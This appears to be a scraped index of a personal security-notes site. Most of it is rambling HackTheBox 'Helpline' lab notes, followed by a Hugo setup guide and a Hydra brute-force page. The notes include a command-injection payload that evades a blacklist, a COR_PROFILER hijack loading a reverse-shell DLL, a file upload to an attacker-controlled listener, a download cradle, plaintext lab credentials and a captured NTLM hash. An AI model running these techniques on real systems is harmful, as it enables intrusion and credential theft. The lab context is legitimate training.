Stern Jeniffer Doe Alive Jones Luis Ribeiro Zachary Moore Fiiona Drake Mary Wong Anne Sergeant  AAAPASSWORD\nLOCALGROUP policy\nnet localgroup \u0026quot;Remote Management Users\u0026quot;  output\nalice tolu  Trying to add alice into the administrators group\nnet localgroup administrators alice /add\t### DENIED  Enumerating user\nnet localgroup Users  output\nAdministrator alice leo niels NT AUTHORITY\\Authenticated Users NT AUTHORITY\\INTERACTIVE tolu zachary  after playing around for awhile i stumbled apon net user. this will tell us information about a specific user instead of the groups. net l\nnet user zachary  trying to find something related to event log readers policies. After some searching around on google i bumped into a command line utility for viewing event logs.\nWEVTUTIL.EXE #### is in the windows\\system32 directory.\nreferences :\n https://docs.microsoft.com/en-us/windows/win32/wes/windows-event-log-tools https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil  c:\\windows\\system32\\wevtutil.exe el /r:helpline /u:helpline\\zachary /p:0987654321 el ENUMERATE EVENT LOG NAMES /u USERNAME /p PASSWORD /r REMOTE COMPUTER NAME  RESULTS\nOpenSSH/Admin muxencode Security Microsoft-Windows-RemoteApp and Desktop Connections/Admin  c:\\windows\\system32\\wevtutil.exe qe \u0026quot;muxencode\u0026quot; /r:helpline /u:helpline\\zachary /p:0987654321 /f:text /rd:true c:\\windows\\system32\\wevtutil.exe qe \u0026quot;security\u0026quot; \u0026quot;/q:*[Security [(Level=2)]]\u0026quot; /r:helpline /u:helpline\\zachary /p:0987654321 /f:text /rd:true  Trying to view zachary powershell logs i get access denied\nhttps://jordanpotti.com/2017/01/20/basics-of-windows-incident-response/\nhttps://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/578627e66b8f5b322df3ae5b/1468409832299/Windows+PowerShell+Logging+Cheat+Sheet+ver+June+2016+v2.pdf\nc:\\windows\\system32\\wevtutil.exe gl \u0026quot;Microsoft-Windows-PowerShell/Operational\u0026quot; /r:helpline /u:helpline\\zachary /p:098765432 \u0026quot;Windows PwerShell\u0026quot;     4720 UserCreated     4725 User Disabled   4726 User Deleted   4722 User Enabled    User created\n4725 User disabled\n4726 User deleted\n4724 ################## This even is created when the a password change is made and FAILS TO MEET PASSSOWRD POLICY. there is another event 4723 passwordreset\nc:\\windows\\system32\\wevtutil.exe qe Security /q:\u0026quot;*[System[(EventID=4724)]]\u0026quot; /c:5 /r:helpline /u:helpline\\zachary /p:0987654321 /f:text /rd:true  4688 Documents each program that is executed, who the program ran as and the process that started this process. The Data for this event can be correlated with 4689. there could be something to this one. maybe transfering all the output to file.\nc:\\windows\\system32\\wevtutil.exe qe Security /q:\u0026quot;*[System[(EventID=4688)]]\u0026quot; /c:20 /r:helpline /u:helpline\\zachary /p:0987654321 /f:text /rd:true  OUTPUT* someone attemped to reset the admin password.\nTASKLIST ### displays a list of currently running proccess remote\ntasklist /S helpline /U helpline/zachary /P 0987654321 /S server name /U domain\\username /P password  TOLU !zaq1234567890pl!99  Enable-WSManCredSSP -Role Client -DelegateComputer helpline.htb -force Invoke-Command –ComputerName helpline.htb –ScriptBlock { Get-WindowsFeature | Where-Object {$_.InstallState –eq ‘Installed’} }  So finding the right event to get th credentials was pretty tough they were allot of recorded events. I saved everything to a file about 36 mega bytes of data.\nEnter-PSSession -ComputerName 10.10.10.132 -Credential tolu  FINDSTR or FINDSTRING is the windows equilivant of grep. i used this while queriering the security logs. to find that user tolu was running net.exe\nc:\\windows\\system32\\wevtutil.exe qe Security /r:helpline /u:helpline\\zachary /p:0987654321 /f:text /rd:true | findstr tolu  net.exe user T: \\\\helpline\\helpdesk_stats /USER:tolu  Going back to the E: drive tolu has access to some more directories. The script is written by leo\nStarts off changing to the E:\\ drive, use Remove-Item to clear output.txt, then checks ports, api, put all of this into output.txt. then it submit a technician_key (CDDBD0A5-5D71-48DE-8FF7-CB9751F0FE7C) and takes the output -Appends it to output.txt. I feel like this could be what i need im not exatly sure what the key is.\nChecks service status using Get-Service servicedesk\nThis also seems like a point we could exploit.\n# restore ServiceDesk data from secure backup folder if required # put name of folder in backups.txt to retrieve it, e.g. backup_postgres_9309_fullbackup_mon  the if statement checks the file path if true then it copies backups.txt from scripts to scripts\\processing. then sanitize user input.\n# script to check ServiceDesk Plus status, and restore backup from secure folder if needed # please report any issues - leo  It changes to the e drive cleans up previous attempts, checks the status of the ports, serviceengine is running.\nRemove-Item E:\\Scripts\\output.txt Get-Date | Add-Content E:\\Scripts\\output.txt  I thought this part was interesting because im pretty sure that might be lou technician key\n# check API Add-Content E:\\Scripts\\output.txt \u0026quot;\u0026quot; Add-Content E:\\Scripts\\output.txt \u0026quot;Check API status\u0026quot; Invoke-RestMethod -Uri http://helpline:8080/sdpapi/request/1/ -Method Post -Body @{OPERATION_NAME='GET_REQUEST';TECHNICIAN_KEY='CDDBD0A5-5D71-48DE-8FF7-CB975$ F0FE7C';} | Out-File E:\\Scripts\\output.txt -Append -Encoding ASCII  Microsoft service doc about invoke-expression mentions sanitizing input in scripts that use this tool. This part checks that the file backups.txt is in scipts. then moves scripts/backups.txt to /script/process/backups.txt. Then it checks user input and remove any blacklisted characters.\nhttps://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6\n# restore ServiceDesk data from secure backup folder if required # put name of folder in backups.txt to retrieve it, e.g. backup_postgres_9309_fullbackup_mon if (Test-Path E:\\Scripts\\backups.txt) { Copy-Item E:\\Scripts\\backups.txt E:\\Scripts\\Processing\\backups.txt # sanitize user input $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;exe\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;msi\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;ps1\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;cmd\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;bat\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;dll\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot; \u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;\u0026amp;\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;{\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;}\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;/\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;\\\\\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;\u0026quot;\u0026quot;\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;\\'\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;\\(\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;\\)\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt $file = Get-Content E:\\Scripts\\Processing\\backups.txt $file -replace \u0026quot;\\.\u0026quot;,\u0026quot;\u0026quot; \u0026gt; E:\\Scripts\\Processing\\backups.txt  BLACKLISTED\nvbs script in the above script sinlge quotes before the backslash is a scape or to signify its a REAL character.\nspace dll exe scripts:cmd,ps1,bat \u0026amp; } { / \\ \u0026quot;\u0026quot; \\ \u0026lt;\u0026lt;=== the single quote is used as an escape. ' ) ( .  for each line in processing/backups.txt it puts the command as a variable uses invoke-expression to run the command. this is necessary to get it to work properly in a script. D should be a indicator the script ran. pipes it over to xcopy which is a tool used for coping files between systems.\nxcopy /E /R /C /Y /H /F /V E:\\Backups\\$backup E:\\Restore\\$backup /c ignores errors /f displays sources and destination file names while copying /h copies files hidden files /e Copies all subdirectories, even if they are empty. /r copies read only /y Suppresses prompting to confirm that you want to overwrite an existing destination file  qmaybe I can base64 encode the string to bypass the blacklist.\n ForEach ($backup in Get-Content \u0026quot;E:\\Scripts\\Processing\\backups.txt\u0026quot;) { $Command = \u0026quot;echo D | xcopy /E /R /C /Y /H /F /V E:\\Backups\\$backup E:\\Restore\\$backup\u0026quot; Invoke-Expression $Command }   Remove-Item E:\\Scripts\\backups.txt Remove-Item E:\\Scripts\\Processing\\backups.txt }  applocker\nIn additions to this trying to get information\u0026rsquo;s out of applocker was kind of a pain. Get-AppLockerPolicy sent the output to a file then used certutil to encode the xml file. copy pasted over the data. The files are rather long every time i tried to use type i would get all kinds of errors. more and cat are the best options. MORE is a windows cmd tool to read large files.\nGet-AppLockerPolicy -Effective -XML \u0026gt; meow.xml certutil -encode meow.xml meow.b64 more cat type = bad crashes terminal  Okay apparently theres Invoke-webrequest POST .\nthis will put the file as the body of the message and send it over. we\u0026rsquo;ll have to remove the header when it\u0026rsquo;s sent over. setup a NetCat listener i like to use the verbose switch so i know if it connects etc. you will have to close the listener to close out everything, just check the bytes to know it\u0026rsquo;s completely finished uploading.\nInvoke-WebRequest -Uri http://10.10.15.57 -Proxy 'http://10.10.15.57:80' -Method Post -InFile meow.xml  nc -lvp 80 \u0026gt; meow.xml  Applocker rule enforcement is applied to a collection of rules. there should be minium of four rule collections installers, executable, Dll, \u0026amp; Scripts.\nIMPORTANT each rule in the policy is an allow and applocker blocks them by default.\nonly the administrator as access to most of it, but in scripts there are a couple of rules that are relevant E:\\scripts* there is a script in the leo directory hmmm. there are a bunch of rules in here like ManageEngine: run.bat\nThis is the big take away from the Applocker policy that any script is allowed to run in E:\\scripts, maybe that run.ps1\nInvoke-Expression\n\u0026ldquo;The Invoke-Expression cmdlet evaluates or runs a specified string as a command and returns the results of the expression or command. Without Invoke-Expression, a string submitted at the command line would be returned (echoed) unchanged.\u0026rdquo;\nSo, To test this out i made a smaller version of the script locally. then while i was playing with i see why what i was trying didn\u0026rsquo;t work. i tried things like in linux \u0026amp; | etc to escape out but this is a litte different. ; to get invoke-expression to escape out run a system command like hostname. ; isn\u0026rsquo;t on the blacklist which might make this way harder.\nForEach ($backup in Get-Content \u0026quot;c:\\Users\\backups.txt\u0026quot;) { $Command = \u0026quot;echo D | xcopy /E /R /C /Y /H /F /V c:\\Users\\$backup c:\\Users\\process\\$backup\u0026quot; Invoke-Expression $Command }  echo \u0026quot;;hostname\u0026quot; \u0026gt; backups.txt  PLAYING AROUND WITH DIFFERENT COMMAND \u0026amp; MORE FILE TYPES\nI have never used any of theses other file types im going to use cmd because it is close to a bat file, it should be easier to find material to read up on. I don\u0026rsquo;t know what i was reading about from this article but it works just like a bat file some of these guides are for administrators and shit they do all this bullshit crap\nhttps://smallbusiness.chron.com/write-cmd-script-53226.html\nGood new\u0026rsquo;s everyone. i got a bunch of problems using robocopy or this other trick i found to copy multiple files. #lazy i ended up writing copy to notepad and pasting over. i dont have time for this copy poo for each test so i put commands ill use multiple times away.\nfor %I in (pie.cmd backups.txt) do copy %I E:\\scripts\\ robocopy C:\\Users\\tolu\\AppData\\Local\\Microsoft\\WindowsApps\\ E:\\Scripts\\ pie.cmd backups.txt  I made two version of the script locally the first simple just to make sure the program runs, the second with the filter. i just setup everything to run the cmd file it removed cmd. it is related to bat file so i believe these might be smart filters. lol\nAbove i talk about the whats being black listed and i do believe the filters are smart for example ./ .\\ or any commination is checked for.\nSo, after talking to some people \u0026amp; reading about how malware is obfuscating powershell i believe.\n  (New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed')  So, after playing with Invoke-obfuscation which is a really cool tool that i would love to use one day. 0xdf talks about it in the malware samples post. While this made things harder to detect and some of them got really close to bypassing the blacklisted characters the list proved to good.\nSo, next thing im going to try is Environmental variables. this is kind of tricky didn\u0026rsquo;t quite work like i hoped it did. it\u0026rsquo;s limited but useful. setting the enviroment variable is pretty straightforward. set NameVariable Path\nThis whole things becoming a bleeping mess. Im currently trying to get the cor_profiler bypass to work, i tried the basics moving up to mingw custom dll. I tried using Beryllium dll but av picked it up. I also checked the firewall fules and using port 443 is fine as we know but still cool to check netsh advfirewall firewall show rule name=all\nSo doing some futher testing when you enter powershell or tzsync it is indeed ran. i believe i am only setting my enviroment variables so it wont affect leo.\n`` email docs common  So there are some characters that cause a string to be treated differently like * does something special i watch daniel bohannon video about powershell encoding obfuscation.\nLets play with the script locally and try to gain a full understanding of what it is doing here. first off it takes input from a text file sanatize it then put\u0026rsquo;s in a variable that invoke-expression calls. we get our command injection via the text file.\nI found another file type .ps2 which is neat to know but period are taken away and also |iex will run a script\nLet\u0026rsquo;s go over all the interesting things about envirment variables and some of the ways they can be further used to run commands.\nexample one we have the backupscript, backups.txt. setx a env variable to point to a script saved as host.ps1 that makes a directory. The blacklisted characters prevent spaces but in a more limited version of the script this will run a command bypassing 90% of the list. i had orginally thought since this was in a powershell script that it wouldn\u0026rsquo;t need powershell. maybe escaping has completely escaped out.\nsetx mkd c:\\users\\user\\host.ps1 echo \u0026quot;powershell $env:mkd\u0026quot;  next well run a command using `t special character for horizontal space. This will also make a directory named meow.\npowershell mkdir`tmeow  setx meow \u0026quot;c:\\users\\user\\host.ps1\u0026quot; set meow=\u0026quot;mkdir meow\u0026quot;  we can use the ; and | to run commands yay. so i can store whatever i want as a enviroment variable and run it through powershell locally but this translating is different.\n;$env:meow|powershell  winrm set winrm/config/server @{TrustedHosts=\u0026quot;*\u0026quot;}  Enter-PsSession –ComputerName helpline.htb –Credentials helpline\\administrator  You may also set enviroment variables with a command scripts or .cmd file. each line is a new command or something like that. ; are nice to add at the end but i dont believe they are necessary.\nbackups.txt\n;$env:death|powershell  set environment variable\nset death=\u0026quot;e:\\scripts\\string.cmd\u0026quot;  string.cmd u may use ;\nset test=1 set test2=\u0026quot;{string}\u0026quot; set test3=\u0026quot;e:\\scripts\\string.dll\u0026quot; tzsync  When you run .\\host it and you have a file named host it will default complete to .ps1 and go down a list.\nif you had the ability to write to any of the save env var you could also create a .ps1 file named after the directory and pipe to poewrshell bypass stuff that way.https://superuser.com/questions/916649/what-is-the-difference-between-setx-and-set-in-environment-variables-in-windows\nthe difference between setx and set. \u0026ldquo;SETX modifies the value permanently, which affects all future shells. it does not modify the enviroment of the shells already running. \u0026ldquo;\n\u0026ldquo;set modifies modifies the current shells (windows) env values. the change is available immediatly. \u0026ldquo;\u0026rdquo;\nwith these things in mind maybe im not affecting leo. by changing my own enviroment vars because he is running the script so it doens\u0026rsquo;t pull from my enviroment vars. super lame\ni can\u0026rsquo;t change change the enviroment variables to effect the outcome. i can only use them to get shell. I can use prexisting env values to run a script. because if i pipe a file to powershell it will append .ps1.\nleo is a helpdesk admin and has full access to helpdesk engine and its install im pretty sure theres cve for that.\nhttps://stackoverflow.com/questions/50018274/why-does-invoke-operator-and-invoke-expression-produce-different-results-for\nsemicolon is the statement separator for powershell.\nwhat the parser see\u0026rsquo;s ; it considers that the end of the first command and starts to parse the second command.\nyou may also set env values using $env:userdomain=\u0026lsquo;foo\u0026rsquo; this is how you set user session variables everything is reset and does not affect other users.\n[Environment]::SetEnvironmentVariable(\u0026quot;Test\u0026quot;, \u0026quot;Test value.\u0026quot;, \u0026quot;User\u0026quot;) 1 [Environment]::SetEnvironmentVariable(\u0026quot;Test\u0026quot;, \u0026quot;Test value.\u0026quot;, \u0026quot;User\u0026quot;)  in summary i can\u0026rsquo;t use values i set 8\nso finally figured out what -m does for setx it sets it for all users pretty neat. tolu does not have the permissions needed to effect all users\nbackups.txt\n;$env:pathext[0]+$env:PUBLIC[2]+$env:COMPUTERNAME[4]+$env:pathext[0]+$env:pathext[16]+$env:pathext[17]+$env:pathext[18]|powershell  l.cmd\nset \u0026quot;COR_ENABLE_PROFILING=1\u0026quot; set \u0026quot;COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}\u0026quot; set \u0026quot;COR_PROFILER_PATH=C:\\Windows\\System32\\spool\\drivers\\color\\revshell.dll\u0026quot; tzsync  https://stackoverflow.com/questions/3803581/setting-a-system-environment-variable-from-a-windows-batch-file\nset \u0026quot;COR_ENABLE_PROFILING=1\u0026quot; set \u0026quot;COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}\u0026quot; set \u0026quot;COR_PROFILER_PATH=c:\\windows\\system32\\drivers\\spool\\color\\revshell.dll\u0026quot; tzsync  in leo documents theres the run.ps1 script. then in desktop find a admin-pass.xml file\n01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa  leo::HELPLINE:34a034b5ad34d844:9E05787B6F70F68C9BAAA127DE5916F2:0101000000000000C0653150DE09D201DE5D7511FE421CA5000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000DE64D50BEE80408A23C06A8E9BF1F9435D8DCF2135E6C75AD19F58C59E7267C00A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E00310031003800000000000000000000000000  using the same shell from the cor profiler you can use that with rundll32 and get a shell that way and i would like to note doing it this way the shell can run powershell.\nso rundll32 will run a dll you can also use it on a revshell but it wont bypass anything.\nrundll32 revshell.dll,main Control_RunDLL    managed to get powershdll to work by using double quotes around the script and ending it with a simi colon.\nidea\u0026rsquo;s with clm bypassed i may no longer need to use cor profiler trick but id like to test out if i can get powershell running based on running the dll with rundll32 it does support powershell. Also test if that bypasses clm. Next use the first part of the bypass run a nishang as leo. Then start enumerating the system more we could also pivot to a meterpreter shell which would be best. then there should be a bunch of ways to get administrator.\nnext, if that all fails enumerate the e drive more. then move back to the base64 string that\u0026rsquo;s encrypted. MOVE THE .XML FILE OFF. run file against it. maybe theres a clue there.\ncheck the e:\\ drive for clues.\nwhen using the c revshell used to create the dlls u have to use the full path.\nC:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe  av detects the meterpreter shell and closes it so i haven\u0026rsquo;t bypassed av boo. lol\nStill no leads on admin-pass.xml i think the major lead is that it in a xml file.\nbypassing clm\n/usr/share/responder/logs/n responder saves previous hashes here.\nHost Name: HELPLINE OS Name: Microsoft Windows Server 2019 Standard OS Version: 10.0.17763 N/A Build 17763 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00429-00521-62775-AA118 Original Install Date: 12/20/2018, 10:07:26 PM System Boot Time: 7/30/2019, 9:39:00 PM System Manufacturer: VMware, Inc. System Model: VMware7,1 System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2993 Mhz [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2993 Mhz BIOS Version: VMware, Inc. VMW71.00V.11599183.B64.1901030933, 1/3/2019 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC+00:00) Dublin, Edinburgh, Lisbon, London Total Physical Memory: 4,095 MB Available Physical Memory: 1,839 MB Virtual Memory: Max Size: 4,799 MB Virtual Memory: Available: 2,489 MB Virtual Memory: In Use: 2,310 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: \\\\HELPLINE Hotfix(s): 7 Hotfix(s) Installed. [01]: KB4462930 [02]: KB4470502 [03]: KB4470788 [04]: KB4471331 [05]: KB4480056 [06]: KB4480979 [07]: KB4480116 Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) 82574L Gigabit Network Connection Connection Name: Ethernet0 DHCP Enabled: No IP address(es) [01]: 10.10.10.132 [02]: fe80::fd05:3add:8e71:eca1 [03]: dead:beef::fd05:3add:8e71:eca1 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displa yed.  mb@letmein@SERVER#acc\nsetting up ccp was touguh first need to edit the local dns file.\nc:\\windows\\system32\\drivers\\etc\\hosts  then need to add helpline.htb to trusted hosts\n Enable-WSManCredSSP -Role Client -DelegateComputer {helpline.htb}  it will prompt for the password and bam\n Enter-PSSession -ComputerName helpline.htb -Credential administrator -authentication credssp  "
},
{
	"uri": "/hackthebox/boxes/helpline/",
	"title": "Helplines",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/hackthebox/github/hugopowershell/",
	"title": "Hugo/Github/Power",
	"tags": [],
	"description": "How to setup a Hugo Static WebPage using PowerShell on GitHub!",
	"content": " POWERSHELL Overview, how to install Hugo and how to set up the web pages using GitHub as repository in a WINDOWS environment. Since most of the commands have a Linux counterpart you could follow.\nFirst off id like to say I wish there was a way to do this with less command line. I initially tried setting it up on GITLAB but I just couldn\u0026rsquo;t find the material I need to do within windows.\nSetting up GitHub Create two repositories the first will be named YourSite(blog whatever you want). the second must be named the desired url I.E chickenpwny.github.io / YourSite.github.io\ngit clone https://github.com/YourSite.git\nInstalling GoLang in windows Windows GoLang  AFTER INSTALLING GOLANG need to setup Hogo the Content Management System CMS. To do this we will need a windows package manger I chose Scoop.\nIF IT HANGS JUST WAIT PANIENTLY FOR ATLEAST ONE MINUTE. mkdir c:\\Hugo\\bin cd c:\\Hugo\\bin Invoke-webRequest -Uri https://github.com/gohugoio/hugo/releases/download/v0.52/hugo_extended_0.52_Windows-64bit.zip -OutFile hugo_extended_0.52_Windows-64bit.zip Expand-Archive -Path .\\hugo_extended_0.52_Windows-64bit.zip -DestinationPath . scoop install unzip cd c:\\Hugo mkdir .\\sites cd .\\sites Now download \u0026amp; install scoop IEX(new-object net.webclient).downloadstring('https://get.scoop.sh') scoop install hugo hugo new site YourSite cd .\\yourSite cd .\\themes git submodule add https://github.com/vjeantet/hugo-theme-docdock.git themes\\hugo-theme-docdock Now we need to set some permission for the repository. If you skip this you may get errors uploading to the repo. submodule add https://github.com/YourSiteCHANGEME/YourSiteCHANGEME.github.io.git public \u0026ndash;  Note, the period before the backslash represents current directory same as in Linux.\nCovering some commands Before we move on from here\nCreate some new content: hugo new content\\first-post.md  To host your webpage locally : hugo server -D localhost  In the content directory adding the _index.md to a folder will make it a page on the site. You can add conent in the _index.md or just use it to name the directory. A little confusing just play around.\nLets say your done editing your content and you want publish your site.\nYou can use type Hugo to generate your site you must be in the root directory of YourSite. I\u0026rsquo;d recommend using the -t switch for theme. You dont need to supply the full path.\n hugo -t YourThemeName cd public git add . git commit -m \u0026quot;a\u0026quot; git push origin master  I had gotten confused initially and tried to upload the theme generator and thought it would generate the site on GitHub. Git hub needs index.html page, so eventually figured out that you generated the content locally then upload it. GitLab generates the content from the generator continuous deployment deal. Ithink GitHub offers it was well different guide.\n"
},
{
	"uri": "/webapp/hydra/",
	"title": "Hydra",
	"tags": [],
	"description": "",
	"content": "Hydra is a WebApp Brutefocer. suupply it with the required information and it will enumrate logins based on customer login word list of you could use rock you.\nHydra v8.8 \u0026copy; 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PO RT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]] Options: -R restore a previous aborted/crashed session -I ignore an existing restore file (don't wait 10 seconds) -S perform an SSL connect -s PORT if the service is on a different default port, define it here -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE -x MIN:MAX:CHARSET password bruteforce generation, type \u0026quot;-x -h\u0026quot; to get help -y disable use of symbols in bruteforce, see above -e nsr try \u0026quot;n\u0026quot; null password, \u0026quot;s\u0026quot; login as pass and/or \u0026quot;r\u0026quot; reversed login -u loop around users, not passwords (effective! implied with -x) -C FILE colon separated \u0026quot;login:pass\u0026quot; format, instead of -L/-P options -M FILE list of servers to attack, one entry per line, ':' to specify port -o FILE write found login/password pairs to FILE instead of stdout -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1 -f / -F exit when a login/pass pair is found (-M: -f per host, -F global) -t TASKS run TASKS number of connects in parallel per target (default: 16) -T TASKS run TASKS connects in parallel overall (for -M, default: 64) -w / -W TIME wait time for a response (32) / between connects per thread (0) -c TIME wait time per login attempt over all threads (enforces -t 1) -4 / -6 use IPv4 (default) / IPv6 addresses (put always in [] also in -M) -v / -V / -d verbose mode / show login+pass for each attempt / debug mode -O use old SSL v2 and v3 -q do not print messages about connection errors -U service module usage details -h more command line options (COMPLETE HELP) server the target: DNS, IP or 192.168.0.0/24 (this OR the -M option) service the service to crack (see below for supported protocols) OPT some service modules support additional input (-U for module help)  SOME EXAMPLE\u0026rsquo;S\nsometimes you get ask for your passsword in prommpt instead of in a web form.\nhydra -L words.txt -P /home/htb/wordlist/seclist/Passwords/Common-Credentials/10-million-password-list-top-1000.txt http-get://meow.htb:8080 -t 64  POST\nThis method is more complex and slightly trickier, be sure to add colons they can be easily be over looked. After the path for the url add a colon. then at the end after the second colon define, what string hydra should look for when enumerating. Finding a string of text to confirm fail can be tricky sometimes hydra cannot find the string because it generated by js or some other language on our side.(believe experienced.)\n hydra 10.10.10.132 -s 8080 -L USERLIST.TXT -P PASSWORDLIST.TXT http-form-post \u0026quot;/j_security_check:j_username=^USER^\u0026amp;j_password=^PASS^\u0026amp;LDAPEnable=false\u0026amp;hidden=Select+a+Domain\u0026amp;hidden=For+Domain\u0026amp;AdEnable=false\u0026amp;DomainCount=0\u0026amp;LocalAuth=No\u0026amp;LocalAuthWithDomain=No\u0026amp;dynamicUserAddition_status=true\u0026amp;localAuthEnable=true\u0026amp;logonDomainName=-1\u0026amp;loginButton=Login\u0026amp;checkbox=checkbox:Username or Password is incorrect\u0026quot;  Breaking down HTTP-FORM-POST\n#the path to whatever it is \u0026quot;/j_security_check: #the parameters j_username=^USER^\u0026amp;j_password=^PASS^\u0026amp;LDAPEnable=false\u0026amp;hidden=Select+a+Domain\u0026amp;hidden=For+Domain\u0026amp;AdEnable=false\u0026amp;DomainCount=0\u0026amp;LocalAuth=No\u0026amp;LocalAuthWithDomain=No\u0026amp;dynamicUserAddition_status=true\u0026amp;localAuthEnable=true\u0026amp;logonDomainName=-1\u0026amp;loginButton=Login\u0026amp;checkbox=checkbox #What hydra looks for in a failed attempt. :Username or Password is incorrect\u0026quot;  "
},
{
	"uri": "/hackthebox/boxes/legacy/",
	"title": "Legacy",
	"tags": [],
	"description": "",
	"content": " NMAP\nnmap -sC -sV -p 139,445 -oA nmap/scripts 10.10.10.4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 19:37 EST Nmap scan report for 10.10.10.4 Host is up (0.042s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: -4h05m13s, deviation: 1h24m51s, median: -5h05m13s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:a4:5d:23 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2019-02-22T23:32:00+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 257.59 seconds  NMAP SCRIPT SMB-VULN\nnmap --script smb-vuln* -p 445 